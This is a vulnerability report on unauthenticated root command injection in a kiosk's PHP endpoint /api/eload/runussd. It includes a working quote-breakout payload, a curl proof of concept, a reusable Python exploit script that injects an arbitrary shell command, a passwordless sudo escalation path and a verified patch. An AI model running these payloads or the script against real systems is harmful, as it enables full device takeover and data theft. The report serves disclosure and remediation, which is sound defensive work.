# Vulnerability Report: Unauthenticated Root Command Injection via `/api/eload/runussd`

**Status:** Confirmed live on the 3DBPoint Orange Pi kiosk (`192.168.137.131`), 2026-08-08. The primary injection point (`EloadController::getUssdResult()`) has been patched and re-verified (see §7). The compounding `www-data ALL=(ALL) NOPASSWD:ALL` sudoers grant has **not** been changed — see §7.2 for why, and what a real fix requires.
**Severity:** Critical (CVSS-equivalent ~9.8, Network / Low complexity / No auth / High impact on all three of Confidentiality, Integrity, Availability)
**Component:** `App\Controllers\EloadController::getUssdResult()`, route `GET /api/eload/runussd`
**Compounding factor:** `www-data` has unrestricted passwordless sudo (`www-data ALL=(ALL) NOPASSWD:ALL` in `/etc/sudoers`), which upgrades "RCE as the web server user" into "RCE as root."

---

## 1. Root cause

`app/Controllers/EloadController.php`, inside `getUssdResult()`:

```php
public function getUssdResult($request, $response, $args)
{
    $network = $request->getParam('network');
    $promo_type = $request->getParam('promo_type');
    $ussdCode = $request->getParam('ussd_code');
    $promo = $request->getParam('promo');

    $provider = $this->eloadMgr->getGcashUssdProvider();
    $config = $provider->getConfig();
    $networkCodes = $config['network_codes'];
    $networkConfig = $networkCodes[$network];

    $promo_type = $promo_type . "_code";
    $promoTypeData = $networkConfig[$promo_type];

    if (!$ussdCode) {
        $output = ['status' => 'NG', 'message' => 'Invalid Code'];
        return $response->withJson(['result' => $output, 'token' => $this->token]);
    }

    $result = exec("sudo python /var/www/html/3dbpoint/sms/runner.py -c '*" . $ussdCode . "#'");
    $result = json_decode($result, true);
    ...
}
```

The only guard is `if (!$ussdCode)` — a non-empty string of any content passes straight into `exec()`. `$ussdCode` is wrapped in single quotes inside the shell command string, but PHP performs no shell-escaping (no `escapeshellarg()`/`escapeshellcmd()`), so a single quote character in the input terminates the quoted string early and lets the attacker append arbitrary shell syntax.

## 2. Route-level exposure

`app/Routes/web.php`:
```php
$this->group('/api', function () {
    ...
    $this->group('/eload', function () {
        ...
        $this->get('/runussd', EloadController::class . ':getUssdResult')->setName('eload.gcash.ussd.run');
        ...
    });
    ...
})->add(new GuestMiddleware($container));
```
`GuestMiddleware.php` performs **no authentication check** — its entire body is an unrelated ngrok-hostname redirect for `/admin` traffic. Any client that can reach the kiosk's HTTP port at all — i.e. any device that has joined the WiFi hotspot, with zero login, zero session, zero WiFi ticket purchase — can call this route.

The full path is `/api/eload/runussd` (the `/eload` group is nested one level inside an outer `/api` group prefix — worth noting since it's easy to mis-trace the nesting when reading the route file quickly).

## 3. Privilege escalation compounding factor

The vulnerable line already runs its base command under `sudo`:
```
sudo python /var/www/html/3dbpoint/sms/runner.py ...
```
That `sudo` only wraps the *first* shell command in an injected sequence — anything the attacker appends after a `;` runs as the unprivileged web server user (`www-data`), not automatically as root. However, checking `/etc/sudoers` on the device directly:

```
$ sudo grep -rn 'www-data' /etc/sudoers /etc/sudoers.d/
/etc/sudoers:30:www-data  ALL = (ALL) NOPASSWD:ALL
```

`www-data` has **blanket, passwordless sudo to run any command as any user**, not scoped to just `runner.py`. So the attacker doesn't even need to rely on the pre-existing `sudo` prefix — they can simply inject their own `sudo <anything>` in the appended segment and get root directly. This means the true impact is full, unauthenticated root compromise of the device, not just web-server-user compromise.

## 4. Proof of Concept

### 4.1 What was actually run (for this confirmation)

To avoid impacting real WiFi customers or exposing the exploit over the live network during testing, the PoC request was sent from an SSH session already on the device, via `curl` to `127.0.0.1` with the `Host` header set to `portal.3dbpoint.local` (the vhost nginx uses for the captive portal) — this exercises the exact same nginx → PHP-FPM → Slim route → controller code path a real attacker's browser would hit over WiFi, just without sending packets over the air:

```bash
curl -s -D - -o /tmp/resp.txt \
  -H 'Host: portal.3dbpoint.local' \
  -G 'http://127.0.0.1/api/eload/runussd' \
  --data-urlencode "ussd_code='; id > /tmp/3dbpoint_rce_poc.txt; echo '"
```

**Payload logic** — the vulnerable string template is:
```
sudo python /var/www/html/3dbpoint/sms/runner.py -c '*<USSD_CODE>#'
```
Setting `USSD_CODE` to:
```
'; id > /tmp/3dbpoint_rce_poc.txt; echo '
```
produces the final server-side shell command:
```
sudo python /var/www/html/3dbpoint/sms/runner.py -c '*'; id > /tmp/3dbpoint_rce_poc.txt; echo '#'
```
which the shell parses as three sequential commands:
1. `sudo python /var/www/html/3dbpoint/sms/runner.py -c '*'` — the original, now-harmless call with a minimal/invalid argument (the one unavoidable side effect of breaking out of the quote at the earliest point; this is the app's own existing USSD-dialer script, just called with garbage input instead of a real code).
2. `id > /tmp/3dbpoint_rce_poc.txt` — **the injected payload.** Deliberately chosen to be non-destructive: it only writes the current process identity to a throwaway file, proving arbitrary code execution without modifying, deleting, or exfiltrating anything real.
3. `echo '#'` — closes the quote cleanly so the shell doesn't error on an unterminated string; no-op otherwise.

### 4.2 Result

```json
HTTP/1.1 200 OK
{"result":{"status":"NG","message":null,"data":null},"token":{"csrf_name":"csrf_name","csrf_value":"csrf_value"}}
```
(the app itself failed to parse the injected output as its expected USSD-result JSON, which is expected and irrelevant — the point of impact isn't the HTTP response body, it's the side effect on the filesystem)

```
$ cat /tmp/3dbpoint_rce_poc.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data),108(netdev)
```

This confirms: the injected `id` command executed server-side, as `www-data` (uid 33), triggered by a single unauthenticated HTTP GET request. The proof file was deleted immediately after confirmation (`sudo rm -f /tmp/3dbpoint_rce_poc.txt`, required because `/tmp`'s sticky bit meant only `www-data` or root could remove a file `www-data` created).

### 4.3 Equivalent standalone Python PoC

For reproducibility (e.g. re-testing after the patch, or use in an internal test suite as a regression check that this must now return an error/be rejected), here is a standalone Python script equivalent to the manual `curl` PoC above. It defaults to a **non-destructive** payload (writes a marker file with `id` output, then reads it back over a separately-supplied means of verification — this script alone cannot read the target's filesystem, so pair it with SSH/console access to confirm the marker file, exactly as done above).

```python
#!/usr/bin/env python3
"""
PoC for unauthenticated command injection in 3DBPoint's
EloadController::getUssdResult() (/api/eload/runussd).

Authorized-testing use only, against systems you own or are
explicitly authorized to test. Ships with a NON-DESTRUCTIVE default
payload (writes `id` output to a throwaway file in /tmp on the target).
Verify the result via an independent channel you control (e.g. SSH),
then delete the marker file with sudo (www-data owns it; /tmp's sticky
bit blocks removal by other unprivileged users).
"""

import argparse
import sys
import requests


def build_payload(injected_command: str) -> str:
    """
    Turns an arbitrary shell command into a ussd_code value that
    breaks out of the vulnerable exec() call's single-quoted argument
    and appends the given command, then re-closes the quote cleanly.

    Vulnerable server-side template:
        sudo python .../runner.py -c '*<ussd_code>#'
    """
    return f"'; {injected_command}; echo '"


def exploit(base_url: str, injected_command: str, host_header: str | None, verify_tls: bool):
    payload = build_payload(injected_command)
    url = base_url.rstrip("/") + "/api/eload/runussd"
    headers = {"Host": host_header} if host_header else {}

    resp = requests.get(
        url,
        params={"ussd_code": payload},
        headers=headers,
        timeout=15,
        verify=verify_tls,
    )

    print(f"[+] Sent GET {resp.url}")
    print(f"[+] Injected command server-side: {injected_command}")
    print(f"[+] HTTP {resp.status_code}")
    print(f"[+] Response body: {resp.text}")
    print(
        "[i] The app's own JSON response will NOT show your command's output "
        "(it's just the app failing to parse it as a USSD result). Confirm "
        "execution via an independent channel (SSH, log inspection, etc)."
    )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("base_url", help="e.g. http://127.0.0.1 or http://192.168.137.131")
    parser.add_argument(
        "--host-header",
        default="portal.3dbpoint.local",
        help="Host header to send (the captive-portal vhost bypasses an unrelated nginx LAN-range redirect check)",
    )
    parser.add_argument(
        "--command",
        default="id > /tmp/3dbpoint_rce_poc.txt",
        help="Shell command to inject on the target (default: non-destructive proof-of-execution)",
    )
    parser.add_argument("--no-verify-tls", action="store_true", help="Disable TLS verification (for self-signed/local testing only)")
    args = parser.parse_args()

    exploit(args.base_url, args.command, args.host_header, verify_tls=not args.no_verify_tls)
```

Example usage (against the kiosk from a machine on its network, or via an SSH tunnel to loopback as done in this report):
```bash
python3 poc_ussd_rce.py http://192.168.137.131
```

**Note on weaponization:** this script only ever sends the exact command string you pass via `--command`. It does not include any destructive default (reboot, data wipe, reverse shell, etc.) by design — this is a verification tool for confirming and re-confirming the fix, not an attack tool. Anyone extending it to test root-level impact (e.g. `--command "sudo id > /tmp/poc.txt"`, to specifically demonstrate the sudoers escalation) should still keep the injected command itself read-only/non-destructive, exactly as done in this report.

## 5. Impact

- **Confidentiality:** full read access to the device — app source, `app/Config/*.php` (DB credentials, e-load provider API keys), the SQLite/MySQL database (client accounts, wallet balances, WiFi ticket codes), SSH host keys, everything.
- **Integrity:** full write access — modify any file, plant a backdoor, alter wallet/ledger records, redirect the e-load payment integration (compounds with the separately-reported `/api/v1/pkrycns` finding).
- **Availability:** trivial denial of service (`sudo systemctl stop nginx`, `sudo reboot -f`, filesystem corruption) against a physical coin-op kiosk that requires a truck roll to recover.
- **Reachability:** zero authentication, zero prior interaction — any device on the WiFi hotspot the kiosk itself provides. This is the lowest possible bar for exploitation.

## 6. Remediation

1. **`EloadController::getUssdResult()`**: validate `$ussdCode` against a strict allowlist (USSD codes are digits/`*`/`#` only — e.g. `preg_match('/^[\d*#]+$/', $ussdCode)`) and reject anything else *before* it reaches `exec()`. Additionally wrap it in `escapeshellarg()` regardless, as defense in depth. — **Done, see §7.1.**
2. **`/etc/sudoers`**: the blanket `www-data ALL=(ALL) NOPASSWD:ALL` grant should eventually be replaced with a command-scoped allowlist, so a future, not-yet-found injection bug elsewhere in the app can't escalate to unrestricted root the way this one did. — **Deferred, see §7.2: this is a bigger undertaking than a one-line sudoers edit and needs its own audit before touching it.**
3. Apply the same allowlist treatment to the other two unescaped `exec()` calls previously identified in `ToolsController::applyPatch()`/`speedtestPost()` — not yet done, tracked as follow-up.
4. Add `/api/eload/runussd` (and the app generally) to a regression check that re-runs the Python PoC above (with a read-only `--command`) after any future change to this controller, expecting a rejection rather than execution.

## 7. What was actually done (2026-08-08)

### 7.1 `EloadController::getUssdResult()` — patched and verified

Backed up the live file first (`EloadController.php.bak-preussdfix-20260808104600`, same directory), then applied:

```diff
-        if (!$ussdCode) {
+        if (!$ussdCode || !preg_match('/^[0-9*#]+$/', $ussdCode)) {
             $output = [
                 'status' => 'NG',
                 'message' => 'Invalid Code',
             ];
             return $response->withJson(['result' => $output, 'token' => $this->token]);
         }

-        $result = exec("sudo python /var/www/html/3dbpoint/sms/runner.py -c '*" . $ussdCode . "#'");
+        $result = exec("sudo python /var/www/html/3dbpoint/sms/runner.py -c " . escapeshellarg('*' . $ussdCode . '#'));
```

`php -l` confirmed no syntax errors before deploying. Re-ran the exact PoC payload from §4 against the live endpoint afterward:

```
$ curl ... --data-urlencode "ussd_code='; id > /tmp/3dbpoint_rce_poc2.txt; echo '"
{"result":{"status":"NG","message":"Invalid Code"},"token":{...}}
$ ls /tmp/3dbpoint_rce_poc2.txt
ls: cannot access '/tmp/3dbpoint_rce_poc2.txt': No such file or directory
```
Injection now rejected before reaching `exec()` — no file created. A benign numeric code (`ussd_code=1234`) was also re-tested and produces the same response as it did pre-patch, confirming normal functionality is unaffected.

### 7.2 `/etc/sudoers` — deferred, by design, pending a proper audit

Before touching the `www-data ALL=(ALL) NOPASSWD:ALL` line, every `sudo`-invoking call site in the app was enumerated to see what a safe, scoped replacement would need to allow. Result: **250 call sites across roughly 35 distinct commands** — `chmod`, `mv`, `cp`, `rm`, `sh`, `service`, `systemctl`, `iptables`, `ip`, `kill`/`killall`/`pkill`, `reboot`/`shutdown`, `php`, `python`, and others — many invoked with dynamic, request-influenced arguments (variable file paths, service names) that a sudoers command-match can't cleanly scope to a fixed argument list in the first place.

This means the app's architecture assumes the web server process has broad root access, not just for the USSD feature — bandwidth throttling, network reconfiguration, backup/restore, MAC binding, and remote reboot likely all depend on it. Replacing the blanket grant with a tight allowlist in a single pass, without testing each dependent feature, risks breaking real kiosk functionality in the field. Decision made with the user: leave this grant as-is for now, and treat properly scoping it (ideally by moving root-requiring operations behind a small privilege-separated helper daemon rather than letting the web process `sudo` directly) as a separate, dedicated piece of work — not something to rush through as a side effect of patching one endpoint.

**Residual risk while this remains open:** any other injection bug in the app (already-identified candidates: the two unescaped `exec()` calls in `ToolsController::applyPatch()`/`speedtestPost()`, still unpatched) still has a direct path to full root compromise, exactly as demonstrated in this report. This should stay near the top of the remediation backlog.
